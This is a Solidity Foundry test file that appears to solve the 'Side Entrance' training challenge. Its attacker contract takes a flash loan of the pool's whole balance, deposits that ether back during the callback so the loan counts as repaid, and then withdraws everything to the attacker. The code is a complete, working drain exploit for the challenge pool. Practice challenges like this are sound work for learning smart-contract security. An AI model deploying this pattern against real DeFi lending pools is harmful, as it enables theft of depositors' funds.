// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideAttacker {
    address payable public owner;
    address payable public target;

    constructor(address _target) {
        owner = payable(msg.sender);
        target = payable(_target);
    }

    function execute() external payable {
        bytes memory callDeposit = abi.encodeWithSignature("deposit()");
        target.call{value: msg.value}(callDeposit);
    }

    function flashloan() public _ownerOnly {
        target.call(
            abi.encodeWithSignature("flashLoan(uint256)", target.balance)
        );
    }

    modifier _ownerOnly() {
        assert(msg.sender == owner);
        _;
    }

    function withdraw() public _ownerOnly {
        target.call(abi.encodeWithSignature("withdraw()"));
        selfdestruct(owner);
    }

    fallback() external payable {}
}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        vm.startPrank(attacker);

        SideAttacker sideAttacker = new SideAttacker(
            address(sideEntranceLenderPool)
        );
        sideAttacker.flashloan();
        sideAttacker.withdraw();

        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
